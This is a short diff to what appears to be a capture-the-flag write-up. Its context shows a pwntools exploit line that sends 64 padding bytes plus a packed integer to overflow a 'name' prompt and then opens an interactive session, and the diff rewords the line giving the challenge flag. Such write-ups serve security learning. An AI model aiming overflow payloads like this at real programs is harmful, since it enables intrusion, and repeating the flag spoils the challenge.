@@ -51,4 +51,4 @@ conn.sendlineafter("name:", b'a' * 64 + p32(420420))
 conn.interactive()
 ```
 
-The flag is `HCMUS-CTF{little_endian_is_fun}`
+Flag: `HCMUS-CTF{little_endian_is_fun}`
